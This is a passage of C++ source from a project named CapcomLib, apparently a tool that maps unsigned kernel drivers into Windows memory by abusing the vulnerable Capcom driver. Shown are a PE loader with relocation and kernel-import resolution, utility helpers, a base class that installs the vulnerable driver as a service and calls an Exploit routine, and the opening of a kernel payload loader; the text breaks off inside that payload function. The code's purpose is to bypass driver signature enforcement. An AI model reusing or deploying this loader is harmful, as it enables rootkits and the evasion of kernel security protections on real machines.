	// Gets the IMAGE_DIRECTORY_ENTRY for the specified index
	const auto& GetDirectoryEntry(WORD DirectoryIndex) const
	{
		return m_Directories.at(DirectoryIndex);
	}

	// Gets the NtHeader ImageBase
	auto GetImageBase() const
	{
		return m_ImageBase;
	}

	// Gets the NtHeader SizeOfImage
	auto GetImageSize() const
	{
		return m_SizeOfImage;
	}

	// Returns entry point RVA
	auto GetEntryPointRVA() const
	{
		return m_AddressOfEntryPointRVA;
	}

	// Returns SizeOfImage field
	auto GetSizeOfImage() const
	{
		return m_SizeOfImage;
	}

private:
	// Map a PE file into memory
	VOID LoadFromFile(const std::wstring & Filename);

	// Parses the PE file structure
	VOID ParsePEHeaders();

private:
	// Handle to the underlying PE file
	Util::Win32::unique_handle m_FileHandle;

	// Handle to the underlying PE file mapping
	Util::Win32::unique_handle m_FileMapping;

	// If the module was loaded by LoadLibrary
	Util::Win32::unique_module m_LoadedModule;

	// Pointer to the base of the PE file (not image mapped!) in memory
	PVOID m_FileMemoryBase;

	// Pointer to the end of the PE file
	PVOID m_FileMemoryEnd;

	// Memory section list for the memory mapper
	std::vector<IMAGE_SECTION_HEADER> m_MemSections;

	// Directory Entries
	std::vector<IMAGE_DATA_DIRECTORY> m_Directories;

private:
	
	// PE Structure Elements below
	// https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files

	// Is the image 64-bit?
	BOOL m_Is64;

	// Is the image an EXE?
	BOOL m_IsExe;

	/* 
	   The preferred address of the first byte of the image when it is loaded in memory.
	   This value is a multiple of 64K bytes. The default value for DLLs is 0x10000000. 
	   The default value for applications is 0x00400000, except on Windows CE where it is 0x00010000. 
	*/
	ULONGLONG m_ImageBase;
	
	/*
	   The size of the image, in bytes, including all headers. Must be a multiple of SectionAlignment.
	*/
	DWORD m_SizeOfImage;

	/* 
	   The combined size of the following items, rounded to a multiple of the value specified in the FileAlignment member.
	   * e_lfanew member of DOS_Header
	   * 4 byte signature
	   * size of COFFHeader
	   * size of optional Header
	   * size of all section headers
	*/
	DWORD m_SizeOfHeaders;

	/*
		A pointer to the entry point function, relative to the image base address. 
		For executable files, this is the starting address. For device drivers, this is the address of the initialization function. 
		The entry point function is optional for DLLs. When no entry point is present, this member is zero.
	*/
	DWORD m_AddressOfEntryPointRVA;

	/*
		The DLL characteristics of the image
	*/
	WORD m_DllCharacteristics;

	/*
		This is a field of bit flags, that show some characteristics of the file.
	*/
	WORD m_Characteristics;
};


```

`CapcomLib/PELoader.cpp`:

```cpp
#include "stdafx.h"
#include "Util.h"
#include "PELoader.h"
#include "Util.h"

using namespace std;

#pragma comment(lib,"ntdll.lib")

// Other modules loaded and mapped for the linking process only
std::unordered_map<std::string, std::shared_ptr<PEImage>> PEImage::MappedModules;

// Modules of the current system when the linking process begins
modules_map PEImage::KernelModules;

PEImage::PEImage(const std::wstring& Filename)
{
	m_PE = make_unique<PEFile>(Filename);
}

PEImage::PEImage(unique_ptr<PEFile> LoadedFile)
{
	m_PE = move(LoadedFile);
}

PEImage::~PEImage()
{
}

HMODULE PEImage::MapForKernel()
{
	return MapFlat(TRUE, FALSE, FALSE);
}

VOID PEImage::GenerateSecurityCookie()
{
	const auto& LoadConfigDD = m_PE->GetDirectoryEntry(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG);
	if (LoadConfigDD.VirtualAddress == 0 || LoadConfigDD.Size == 0)
	{
		// No load options
		return;
	}

	auto LoadConfigDir = FromRVA<PIMAGE_LOAD_CONFIG_DIRECTORY>(LoadConfigDD.VirtualAddress);

	if (!LoadConfigDir->SecurityCookie)
	{
		// No security cookie
		return;
	}

	// This actually gets relocated... interesting.
	auto SecurityCookie = MakePointer<PSIZE_T>(LoadConfigDir->SecurityCookie);

	// Do we really care about generating the correct 'secure' cookie here? I'm going to say 'no'.
	auto RandomCookie = Util::Random::Generate64();

	*SecurityCookie = RandomCookie;
}

VOID PEImage::_MapSafeCopy(PBYTE TargetVA, PBYTE SourceVA, SIZE_T Size)
{
	auto targetEnd = TargetVA + Size;

	if (TargetVA > GetMappedEnd<PBYTE>() || TargetVA < GetMappedBase<PBYTE>())
	{
		Util::Exception::Throw("TargetVA is outside mapped section!");
	}

	if (targetEnd > GetMappedEnd<PBYTE>() || targetEnd < TargetVA)
	{
		Util::Exception::Throw("SourceVA is outside of mapped section!");
	}

	RtlCopyMemory(TargetVA, SourceVA, Size);
}

void PEImage::GetSystemModules()
{
	if (PEImage::KernelModules.size() > 0)
	{
		// Don't update more than once
		return;
	}

	// Try a size and then increase if necessary
	auto initialSize = 0x10000;
	auto actualSize = ULONG{};
	auto ModuleInfo = Util::Win32::unique_virtalloc<_RTL_PROCESS_MODULES>
	{
		reinterpret_cast<PRTL_PROCESS_MODULES>
		(
			VirtualAlloc(NULL, initialSize, MEM_COMMIT, PAGE_READWRITE)
		)
	};

	if (!ModuleInfo) Util::Exception::ThrowLastError(L"VirtualAlloc");

	auto res = NtQuerySystemInformation(SystemModuleInformation, ModuleInfo.get(), initialSize, &actualSize);
	if (res == STATUS_INFO_LENGTH_MISMATCH)
	{
		// Release old ModuleInfo and allocate one with actual size
		ModuleInfo = Util::Win32::unique_virtalloc<_RTL_PROCESS_MODULES>
		{
			reinterpret_cast<PRTL_PROCESS_MODULES>
			(
				VirtualAlloc(NULL, actualSize, MEM_COMMIT, PAGE_READWRITE)
			)
		};
		if (!ModuleInfo) Util::Exception::ThrowLastError(L"VirtualAlloc");

		// Query again
		res = NtQuerySystemInformation(SystemModuleInformation, ModuleInfo.get(), initialSize, &actualSize);
	}

	PEImage::KernelModules.reserve(ModuleInfo->NumberOfModules);

	for (auto i = 0ULL; i < ModuleInfo->NumberOfModules; i++)
	{
		// Get just the file ImportName of each module
		auto mod = ModuleInfo->Modules[i];
		auto fullName = mod.FullPathName;
		auto name = mod.FullPathName + mod.OffsetToFileName;

		auto strName = string{ name };
		Util::String::ToLower(strName);
	
		// Add it by value to the vector
		PEImage::KernelModules[name] = ModuleInfo->Modules[i];
	}
}

shared_ptr<PEImage> PEImage::FindOrMapKernelDependency(string ModuleName)
{
	//keep uppercase name for find() method in unordered map
	auto ModuleNameCorrect = ModuleName;
	// Lowercase name
	Util::String::ToLower(ModuleName);

	// If it's been loaded already, use that one.
	auto LoadedMod = PEImage::MappedModules.find(ModuleName);
	if (LoadedMod != PEImage::MappedModules.end())
	{
		Util::Debug::Print("[CACHED]\n");
		return shared_ptr<PEImage>(LoadedMod->second);
	}

	// Find the modules from NTQSI output
	auto SysMod = PEImage::KernelModules.find(ModuleNameCorrect);
	if (SysMod == PEImage::KernelModules.end())
	{
		Util::Exception::Throw("Driver attempted to import from an unloaded kernel module '%s'. "
			"Loading kernel imports at runtime is not supported!",
			ModuleName.c_str());
	}

	// If there's not already a loaded module, find and load the module from the kernel that will resolve the link

	// This is ugly as hell right here.
	// NTQSI will return NT namespaces '\SystemRoot\system32\ntoskrnl.exe'
	// We convert that to wide character -> L'\SystemRoot\system32\ntoskrnl.exe'
	// Then we use internal APIs to convert this to a DOS name -> '\\?\C:\Windows\System32\ntoskrnl.exe'
	// Then convert to wide character -> L'\\?\C:\Windows\System32\ntoskrnl.exe'
	auto SysModule = SysMod->second;
	auto FullNameNative = SysModule.FullPathName;
	auto wFullNameNative = Util::String::ToUnicode(FullNameNative);

	auto FullNameNtPath = Util::Win32::NtNativeToWin32(wFullNameNative);
	if (FullNameNtPath.length() == 0)
	{
		Util::Exception::Throw("Failed to get full path for '%s'", FullNameNative);
	}

	auto wFullName = Util::String::ToUnicode(FullNameNtPath);

	// Load PE from disk
	auto ModulePE = make_shared<PEImage>( wFullName );

	// Map the module flat
	// loaderBase = SysModule.ImageBase -- Our module is actually mapped in the kernel, so when we resolve exports
	//                                     we want to resolve to the kernel address, not our locally mapped one
	auto res = ModulePE->MapFlat(TRUE, SysModule.ImageBase, TRUE);

	Util::Debug::Print("[MAPPED %p => %p]\n", SysModule.ImageBase, res);

	return ModulePE;
}

PVOID PEImage::FindImport(
	const char* ImportName,
	int Ordinal)
{
	// Import by name
	if (Ordinal == -1)
	{
		return GetExportByName(ImportName);
	}
	// Import by ordinal
	else
	{
		return GetExportByOrdinal(Ordinal);
	}
}

PVOID PEImage::GetExportByName(const char* ImportName)
{
	const auto& ExportDDir = m_PE->GetDirectoryEntry(IMAGE_DIRECTORY_ENTRY_EXPORT);

	// No exports
	if (ExportDDir.VirtualAddress == 0 || ExportDDir.Size == 0)
	{
		return NULL;
	}

	auto ExportDir = FromRVA<PIMAGE_EXPORT_DIRECTORY>(ExportDDir.VirtualAddress);

	// List of function addresses accessed by ordinal
	auto FuncList = FromRVA<DWORD*>(ExportDir->AddressOfFunctions);

	// List of function names accessed top down
	auto NameList = FromRVA<DWORD*>(ExportDir->AddressOfNames);

	// List of ordinals accessed top down
	auto NameOrdinalList = FromRVA<WORD*>(ExportDir->AddressOfNameOrdinals);

	DWORD Low = 0, Mid = 0;

	DWORD High = ExportDir->NumberOfNames - 1;

	// Binary search over names
	while(High >= Low)
	{
		Mid = (Low + High) / 2;

		auto name = FromRVA<const char*>(NameList[Mid]);

		// Compare import name
		auto cmp = strcmp(ImportName, name);
		if (cmp < 0)
		{
			High = Mid - 1;
		}
		else if (cmp > 0)
		{
			Low = Mid + 1;
		}
		else
		{
			break;
		}
	}

	// Was it found?
	if (High < Low) return NULL;

	auto nameOrdinal = NameOrdinalList[Mid];

	// Validate ordinal
	if (nameOrdinal >= ExportDir->NumberOfFunctions) return NULL;

	auto func = FuncList[nameOrdinal];

	// Use actual base, if mapping externally.
	// Otherwise, use our local mapped base.
	auto OutputAddress = (SIZE_T)((SIZE_T)GetActualBase() + func);

	return (PVOID)OutputAddress;
}

PVOID PEImage::GetExportByOrdinal(WORD InputOrdinal)
{
	const auto& ExportDDir = m_PE->GetDirectoryEntry(IMAGE_DIRECTORY_ENTRY_EXPORT);

	// No exports
	if (ExportDDir.VirtualAddress == 0 || ExportDDir.Size == 0)
	{
		return NULL;
	}

	auto ExportDir = FromRVA<PIMAGE_EXPORT_DIRECTORY>(ExportDDir.VirtualAddress);

	// List of function addresses accessed by ordinal
	auto FuncList = FromRVA<DWORD*>(ExportDir->AddressOfFunctions);

	// Function address of 
	SIZE_T OutputAddress = 0;

	auto targetOrd = InputOrdinal - ExportDir->Base;

	if (targetOrd >= ExportDir->NumberOfFunctions)
	{
		Util::Exception::Throw("Import by ordinal exceeds number of functions");
	}

	// Ordinal goes directly into func list
	auto func = FuncList[targetOrd];

	// Use actual base, if mapping externally.
	// Otherwise, use our local mapped base.
	OutputAddress = (SIZE_T)((SIZE_T)GetActualBase() + func);
	
	return (PVOID)OutputAddress;
}

void PEImage::LinkImage(BOOL IsKernel)
{
	// Update the kernel modules list if necessary
	if (IsKernel)
	{
		GetSystemModules();
	}

	const auto& ImportDDir = m_PE->GetDirectoryEntry(IMAGE_DIRECTORY_ENTRY_IMPORT);

	// First entry in import descriptor table
	auto CurImportEntry = MakePointer<PIMAGE_IMPORT_DESCRIPTOR>(GetMappedBase<>(), ImportDDir.VirtualAddress);

	// Go through each entry until Name is NULL (the all-null entry that acts as the terminator)
	for (; CurImportEntry->Name; CurImportEntry++)
	{
		// Name of the module to import from ex. 'ntoskrnl.exe'
		auto ModuleName = FromRVA<char*>(CurImportEntry->Name);

		shared_ptr<PEImage> TargetModule;
		if (IsKernel)
		{
			Util::Debug::Print("Import from %s... ", ModuleName);
			TargetModule = FindOrMapKernelDependency(ModuleName);
		}
		else
		{
			throw exception("Not implemented");
		}

		// The address of the table of thunks containing the IAT entry to place the resolved function once when we get it
		auto IATThunk = FromRVA<IMAGE_THUNK_DATA*>(CurImportEntry->FirstThunk);

		// The address of the table of Name/Ordinal thunks. 
		// If it's import by ordinal, the ordinal will be there.
		// If it's import by ImportName, a pointer to the ImportName will be there.
		auto NameThunk = FromRVA<IMAGE_THUNK_DATA*>(CurImportEntry->OriginalFirstThunk);

		if (CurImportEntry->OriginalFirstThunk == 0)
		{
			// No separate ImportName table
			NameThunk = IATThunk;
		}

		// Loop through both tables until null terminated
		while (NameThunk->u1.AddressOfData)
		{
			auto ordinal = -1;
			auto isOrdinalImport = NameThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG;
			const char* ImportName;

			if (isOrdinalImport)
			{
				// Import by ordinal
				ordinal = NameThunk->u1.Ordinal & 0xFFFF;
			}
			else
			{
				// Import by ImportName
				ImportName = FromRVA<IMAGE_IMPORT_BY_NAME*>(NameThunk->u1.AddressOfData)->Name;
			}

			auto addr = (SIZE_T)TargetModule->FindImport(ImportName, ordinal);
			if (!addr)
			{
				Util::Exception::Throw("Could not find import ('%s', %i) for module", ImportName, ordinal);
			}
				
			// IAT
			IATThunk->u1.Function = (SIZE_T)addr;

			Util::Debug::Print("\t%s => Addr: 0x%I64X, IAT: %p\n", ImportName, addr - (SIZE_T)TargetModule->GetActualBase(), &IATThunk->u1.Function);

			if (NameThunk == IATThunk)
			{
				NameThunk++;
			}
			else
			{
				NameThunk++;
				IATThunk++;
			}
		}

	}
}

HMODULE PEImage::MapFlat(BOOL isForKernel, PVOID loaderBase, BOOL loadAsDataFile)
{
	// Ensure we've allocated space for the entire image
	AllocFlat();

	auto HeadersBase = m_PE->GetHeadersBase();
	auto HeadersSize = m_PE->GetHeadersSize();

	// Copy PE headers
	_MapSafeCopy(GetMappedBase<PBYTE>(), MakePointer<PBYTE>(HeadersBase), HeadersSize);

	// Copy each section into its preferred location
	// NOTE: Does not check for overlapping sections
	// When mapping flat, unfilled space between sections will be filled with 00s
	const auto& memSections = m_PE->GetSections();
	for (const auto& sec : memSections)
	{
		auto secData = m_PE->FromOffset<PBYTE>(sec.PointerToRawData);
		auto targetVA = FromRVA<PBYTE>(sec.VirtualAddress);

		_MapSafeCopy(targetVA, secData, sec.SizeOfRawData);
	}

	// Do relocations if necessary
	DoRelocateImage();

	// If there's a custom loader base, set it here
	// Useful if the module is preparing to be mapped elsewhere, like the kernel
	if (loaderBase)
	{
		m_ActualBaseAddress = loaderBase;
	}

	// Rescursively resolves imports when not loaded as a data file
	if (!loadAsDataFile)
	{
		// Resolve imports, load dependencies, etc.
		LinkImage(isForKernel);

		// Required for some images
		GenerateSecurityCookie();
	}

	return GetMappedBase<HMODULE>();
}


VOID PEImage::AllocFlat()
{
	if (m_Mem) return;

	auto totalSize = m_PE->GetTotalMappedSize();

	auto alloc = Util::Win32::unique_virtalloc<>
	{
		VirtualAllocEx(GetCurrentProcess(), NULL, totalSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
	};
	if(!alloc) Util::Exception::ThrowLastError(L"VirtualAllocEx");

	m_Mem = move(alloc);
	m_MemSize = totalSize;

	// Can be overwritten later, in the case of kernel exports
	m_ActualBaseAddress = m_Mem.get();
}

auto PEImage::ProcessRelocationBlocks(PWORD BlocksAddress, PULONG RelocBaseAddress, SIZE_T RelocDelta, SIZE_T Count)
{
	auto CurrentBlock = BlocksAddress;
	for (SIZE_T i = 0; i < Count; i++)
	{
		// 4-bits Type, 12-bits Offset
		auto OffsetType = *CurrentBlock;

		// Offset from the RelocBaseAddress to apply Delta
		auto Offset = OffsetType & 0xFFF;

		// Relocation Type
		auto Type = OffsetType >> 12;

		// Target to apply the relocation
		auto RealTargetShortPtr = MakePointer<PSHORT>(RelocBaseAddress, Offset);
		auto RealTargetLongPtr = MakePointer<PULONG>(RealTargetShortPtr);
		auto RealTargetLongLongPtr = MakePointer<PULONGLONG>(RealTargetShortPtr);

		// From ReactOS (Just want to make sure I get this exactly right)
		switch (Type)
		{
		case IMAGE_REL_BASED_ABSOLUTE:
			break;

		case IMAGE_REL_BASED_HIGH:
			*RealTargetShortPtr = HIWORD(MAKELONG(0, *RealTargetShortPtr) + (RelocDelta & 0xFFFFFFFF));
			break;

		case IMAGE_REL_BASED_LOW:
			*RealTargetShortPtr = *RealTargetShortPtr + LOWORD(RelocDelta & 0xFFFF);
			break;

		case IMAGE_REL_BASED_HIGHLOW:
			*RealTargetLongPtr = *RealTargetLongPtr + (RelocDelta & 0xFFFFFFFF);
			break;

		case IMAGE_REL_BASED_DIR64:
			*RealTargetLongLongPtr = *RealTargetLongLongPtr + RelocDelta;
			break;

		default:
			Util::Exception::Throw("Given relocation type was not supported (0x%llX)", Type);
			break;
		}

		// Go to the next block
		CurrentBlock++;
	}
	return (PIMAGE_BASE_RELOCATION)CurrentBlock;
}

VOID PEImage::DoRelocateImage()
{
	auto BaseAddress = GetMappedBase<PBYTE>();
	if (m_PE->HasFileCharacteristic(IMAGE_FILE_RELOCS_STRIPPED))
	{
		// File does not have relocations
		return;
	}
	else
	{
		const auto& RelocDDir = m_PE->GetDirectoryEntry(IMAGE_DIRECTORY_ENTRY_BASERELOC);

		if (RelocDDir.VirtualAddress == 0 || RelocDDir.Size == 0)
		{
			// No relocations
			return;
		}

		// The Delta to add to each relocation entry address to relocate
		auto RelocDelta = MakePointer<LONGLONG>(BaseAddress - m_PE->GetImageBase());

		// Sanity check. Relocations do not have to be applied.
		if (RelocDelta == 0)
		{
			return;
		}

		auto RelocDir = MakePointer<PIMAGE_BASE_RELOCATION>(BaseAddress, RelocDDir.VirtualAddress);
		auto RelocEnd = MakePointer<PIMAGE_BASE_RELOCATION>(RelocDir, RelocDDir.Size);

		if (RelocDir >= RelocEnd)
		{
			Util::Exception::Throw("Base relocation entry table was 0 or negative size!");
		}

		// Iterate through each base directory, then fix each block list inside the base directory
		// NtHeadersDirectory -> PIMAGE_BASE_RELOCATION[] -> Blocks[]

		while (RelocDir < RelocEnd && RelocDir->SizeOfBlock > 0)
		{
			// Number of relocations in this IMAGE_BASE_RELOCATION
			auto Count = (RelocDir->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);

			// Address to offset from for the relocation blocks
			auto Address = MakePointer<PULONG>(BaseAddress, RelocDir->VirtualAddress);

			// Address of the Blocks which contain the Type|Address bitfields
			auto BlocksAddress = MakePointer<PWORD>(RelocDir, sizeof(IMAGE_BASE_RELOCATION));

			// Process each entry in the block
			RelocDir = ProcessRelocationBlocks(BlocksAddress, Address, RelocDelta, Count);
		}
	}

	return;
}

```

`CapcomLib/PELoader.h`:

```h
#pragma once

#include "stdafx.h"
#include "Win32Util.h"
#include "Util.h"
#include "PEFile.h"
#include "Win32Kernel.h"

class PEImage;

// Pair of (KLoadedImageBase, PEImage)
using loaded_kmodule_entry = std::pair<PVOID, std::shared_ptr<PEImage>>;

// A simple PE loader, doesn't do anything fancy yet
// Based off of some code snippets of other loaders here and there
class PEImage
{
public:
	// Load a PE file from the path specified by Filename
	PEImage(const std::wstring& Filename);

	// PE file is already loaded
	PEImage(std::unique_ptr<PEFile> LoadedFile);

	~PEImage();

	// Maps and links a module in preparation to be copied directly to the kernel
	HMODULE MapForKernel();

	// Generates a random security cookie for stack overflow checks. Required by some drivers for operation.
	VOID GenerateSecurityCookie();

	// Gets a pointer to the end of mapped memory
	template<typename TargetPtr>
	auto GetMappedEnd() const
	{
		return MakePointer<TargetPtr>(m_Mem.get(), m_MemSize);
	}

	// Gets a pointer to the beginning of mapped memory
	template<typename TargetPtr = PVOID>
	auto GetMappedBase() const
	{
		return MakePointer<TargetPtr>(m_Mem.get());
	}

	// Calculate an offset from the base of mapped memory
	template<typename TargetPtr = PVOID>
	TargetPtr FromRVA(SIZE_T Offset) const
	{
		auto ptr = MakePointer<TargetPtr>(m_Mem.get(), Offset);
		if (ptr >= GetMappedEnd<TargetPtr>() || ptr < m_Mem.get())
		{
			Util::Exception::Throw("FromRVA: Invalid mapped address");
		}
		return ptr;
	}

	// If this module is already loaded in memory elsewhere (like the kernel), returns its base address
	auto GetActualBase() const
	{
		return m_ActualBaseAddress;
	}

	// Gets the entry point RVA
	auto GetEntryPointRVA() const
	{
		return m_PE->GetEntryPointRVA();
	}

	// Gets the total size of the entire mapped region
	auto GetMappedSize() const
	{
		return m_PE->GetSizeOfImage();
	}

private:

	// Maps a PE file into memory as a loaded image. 
	// Maps the entire image into a flat area of memory. 
	// Does not create separate allocations for each section.
	// Useful for driver modules because their sections are typically mapped flat with the PE
	HMODULE MapFlat(BOOL isForKernel = TRUE, PVOID loaderBase = 0, BOOL loadAsDataFile = FALSE);

	// Use VirtualAlloc to allocate memory to map the entire image
	// NOTE: This is a flat allocator. The image will be in one large mapped
	// section. At the moment, this is preferrable for the task at hand!
	VOID AllocFlat();

	// Relocates an image in memory by fixing up each address specified in the PE
	VOID DoRelocateImage();

	// Process the Blocks field of a single IMAGE_BASE_RELOCATION
	auto ProcessRelocationBlocks(PWORD BlocksAddress, PULONG RelocBaseAddress, SIZE_T RelocDelta, SIZE_T Count);

	// Safe copy to mapped sections
	VOID _MapSafeCopy(PBYTE TargetVA, PBYTE SourceVA, SIZE_T Size);

	// Uses NtQuerySystemInformation to get addresses of system modules
	void GetSystemModules();

	// Resolves import for manually mapped image
	void PEImage::LinkImage(BOOL IsKernel);
	
	// Loads a kernel module off of the disk by name, using information from NTQSI
	std::shared_ptr<PEImage> PEImage::FindOrMapKernelDependency(std::string ModuleName);

	// Finds the export RVA of either a name or ordinal import
	PVOID PEImage::FindImport(
		const char* ImportName,
		int Ordinal);

	// Get actual mapped address of export by name
	PVOID PEImage::GetExportByName(const char* ImportName);

	// Get actual mapped address of export by ordinal
	PVOID PEImage::GetExportByOrdinal(WORD InputOrdinal);

private:
	// Loaded and parsed PE File
	std::unique_ptr<PEFile> m_PE;

	// Memory of the manually mapped image
	Util::Win32::unique_virtalloc<> m_Mem;

	// Size of manually memory mapped image
	SIZE_T m_MemSize;

	// Actual base address for linking modules in-place
	PVOID m_ActualBaseAddress;

	// Other modules loaded and mapped for the linking process only
	static std::unordered_map<std::string, std::shared_ptr<PEImage>> MappedModules;

	// Modules of the current system when the linking process begins
	static modules_map KernelModules;
};

```

`CapcomLib/Util.h`:

```h
#pragma once
#include "stdafx.h"

// Prints a Win32 error and exits the console program
// https://github.com/iceb0y/ntdrvldr/blob/master/main.c
VOID PrintErrorAndExit(wchar_t *Function, ULONG dwErrorCode);

// Pointer type conversion with no offset
template<typename TargetType>
TargetType MakePointer(void* anyptr)
{
	return reinterpret_cast<TargetType>(anyptr);
}

// Pointer type conversion with no offset
template<typename TargetType>
TargetType MakePointer(SIZE_T anyptr)
{
	return reinterpret_cast<TargetType>(anyptr);
}


// Pointer type conversion with byte offset
template<typename TargetType>
TargetType MakePointer(void* anyptr, SIZE_T offset)
{
	return reinterpret_cast<TargetType>(reinterpret_cast<SIZE_T>(anyptr) + offset);
}

// Header only utility class... should have made this a long time ago
namespace Util
{
	namespace Debug
	{
		// Prints a formatted message only during debug
		inline static void Print(const char* fmt, ...)
		{
#if _DEBUG
			va_list args;
			va_start(args, fmt);
			vprintf(fmt, args);
			va_end(args);
#endif
		}
	};

	namespace String
	{
		// Converts the string to lower case
		inline static void ToLower(std::string& str)
		{
			std::transform(str.begin(), str.end(), str.begin(), [](UCHAR c) { return ::tolower(c); });
		}

		// Convert a wide Unicode string to an UTF8 string
		static inline std::string ToUTF8(const std::wstring &wstr)
		{
			if (wstr.empty()) return std::string();
			int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
			std::string strTo(size_needed, 0);
			WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
			return strTo;
		}

		// Convert an UTF8 string to a wide Unicode String
		static inline std::wstring ToUnicode(const std::string &str)
		{
			if (str.empty()) return std::wstring();
			int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
			std::wstring wstrTo(size_needed, 0);
			MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
			return wstrTo;
		}
	};
	
	namespace Random
	{
		// Not secure
		inline static std::mt19937_64 __random_gen = std::mt19937_64{ std::random_device{}() };

		// Generate a random size_t integer from C++ stl, not secure
		inline static ULONGLONG Generate64()
		{
			return Util::Random::__random_gen();
		}
	};
	
	namespace Path
	{
		// Convert a relative file path to an absolute file path (from the current executable)
		inline static std::wstring RelativeToAbsolute(const std::wstring& RelativePath)
		{
			auto curdir = std::wstring{ };
			auto fpath = std::wstring{ };

			curdir.reserve(MAX_PATH);
			fpath.reserve(MAX_PATH);

			GetModuleFileName(NULL, &curdir[0], MAX_PATH);

			PathRemoveFileSpec(&curdir[0]);

			PathCombine(&fpath[0], &curdir[0], RelativePath.c_str());

			return fpath;
		}
	};

	namespace Exception
	{
		// Throw a C-style formatted exception
		template<typename ... Args>
		static void Throw(const std::string& format, Args ... args)
		{
			SIZE_T size = snprintf(nullptr, 0, format.c_str(), args ...) + 1;
			auto buf = std::string{};
			buf.resize(size);
			snprintf(&buf[0], size, format.c_str(), args ...);
			throw std::runtime_error(buf);
		}

		// Throw an exception given a Win32 error code
		static inline VOID ThrowWin32ErrorCode(const std::wstring& FunctionName, ULONG dwErrorCode)
		{
			LPSTR Buffer;
			FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |
				FORMAT_MESSAGE_FROM_SYSTEM |
				FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				dwErrorCode,
				LANG_USER_DEFAULT,
				(LPSTR)&Buffer,
				0,
				NULL);

			Util::Exception::Throw("%ws: %s", FunctionName.c_str(), Buffer);
		}

		// Throw an exception given a Win32 error code
		static inline VOID ThrowWin32ErrorCode(const std::string& FunctionName, ULONG dwErrorCode)
		{
			LPSTR Buffer;
			FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER |
				FORMAT_MESSAGE_FROM_SYSTEM |
				FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL,
				dwErrorCode,
				LANG_USER_DEFAULT,
				(LPSTR)&Buffer,
				0,
				NULL);

			Util::Exception::Throw("%s: %s", FunctionName.c_str(), Buffer);
		}

		// Throw GetLastError as exception
		static inline VOID ThrowLastError(const std::wstring& FunctionName)
		{
			Util::Exception::ThrowWin32ErrorCode(Util::String::ToUTF8(FunctionName), GetLastError());
		}

		// Throw GetLastError as exception
		static inline VOID ThrowLastError(const std::string& FunctionName)
		{
			Util::Exception::ThrowWin32ErrorCode(FunctionName, GetLastError());
		}
	};

};

#include "Win32Util.h"
```

`CapcomLib/VulnDrivers/BaseVulnDriver.cpp`:

```cpp
#include "stdafx.h"
#include "BaseVulnDriver.h"

bool BaseVulnDriver::EnsureValidTarget()
{
	Util::Debug::Print("BaseVulnDriver::EnsureValidTarget\n");

	return true;
}

void BaseVulnDriver::Exploit()
{
	Util::Debug::Print("BaseVulnDriver::Exploit [%S]\n", Options.ServiceName.c_str());
}

void BaseVulnDriver::Cleanup()
{
	Util::Debug::Print("BaseVulnDriver::Cleanup\n");

	// Unload the driver from the system
	DriverLoader::RemoveServiceIfExists(Options.ServiceName);
}

const std::wstring& BaseVulnDriver::GetVulnDriverName()
{
	return m_DriverName;
}

bool BaseVulnDriver::MapDriver(const std::wstring& DriverLocation, const std::wstring& DisplayName)
{
	auto self = dynamic_cast<IVulnDriver*>(this);
	const auto& VulnDriverName = self->GetVulnDriverName();

	Util::Debug::Print("MapVulnDriver :: Begin load '%ws'\n", VulnDriverName.c_str());

	auto path = Util::Path::RelativeToAbsolute(L"/drivers/" + VulnDriverName);

	if (!EnsureValidTarget())
	{
		Util::Debug::Print("MapVulnDriver :: Not a valid target\n");
		return false;
	}

	Util::Debug::Print("MapVulnDriver :: Machine is valid\n");

	// Load and map the target driver
	auto target = std::make_unique<PEImage>(DriverLocation);

	// Create service for vuln driver
	DriverLoader::MakeService(path, DisplayName);

	if (!EnsureDriverLoaded())
	{
		Util::Debug::Print("MapVulnDriver :: Driver did not load properly\n");
		Cleanup();
		return false;
	}

	Util::Debug::Print("MapVulnDriver :: Service loaded [%S]\n", DisplayName.c_str());

	// Setup options so the BaseVulnDriver has access to 
	Options.Image = move(target);
	Options.ServiceName = DisplayName;

	try
	{
		Exploit();
		Util::Debug::Print("MapVulnDriver :: Exploit successful\n");
	}
	catch (std::exception e)
	{
		// Ask driver to clean up resources then rethrow
		Cleanup();
		throw e;
	}

	// Cleanup and finish
	Cleanup();

	return true;
}

```

`CapcomLib/VulnDrivers/BaseVulnDriver.h`:

```h
#pragma once
#include "IVulnDriver.h"
#include "../DriverLoader.h"
#include "../PELoader.h"
#include "../Win32Kernel.h"
#include "../Util.h"

class VulnDriverOptions
{
public:
	// The PEImage to be loaded by the vuln driver, loaded PreExploit is called
	std::unique_ptr<PEImage> Image;

	// Service name created by the loader
	std::wstring ServiceName;
};

class BaseVulnDriver : public IVulnDriver
{
public:
	// Inherited via IVulnDriver
	virtual bool MapDriver(const std::wstring& DriverLocation, const std::wstring& DisplayName) override;

	virtual bool EnsureValidTarget() override;

	virtual void Exploit() override;

	virtual void Cleanup() override;

	virtual const std::wstring& GetVulnDriverName() override;

protected:

	// All options requested by the driver loader for the vulnerable driver to adhere to
	VulnDriverOptions Options;

private:
	const std::wstring m_DriverName = L"Unknown";

};


```

`CapcomLib/VulnDrivers/CapcomDriver.cpp`:

```cpp
#pragma once
#include "stdafx.h"
#include "CapcomDriver.h"
#include "../KernelHelp.h"

DECLARE_UNICODE_STRING(strAllocPoolWithTag, L"ExAllocatePoolWithTag");

PVOID CapcomDriver::PayloadImage;
SIZE_T CapcomDriver::PayloadSize;
DWORD CapcomDriver::PayloadEntryRVA;
void(__stdcall *CapcomDriver::PayloadEntry)(PVOID DriverObject, PVOID RegistryEntry);

PVOID NTAPI CapcomDriver::LoaderPayload(MmGetSystemRoutineFunc _MmGetSystemRoutineAddress)
{
	// Allocate executable unpaged memory for driver
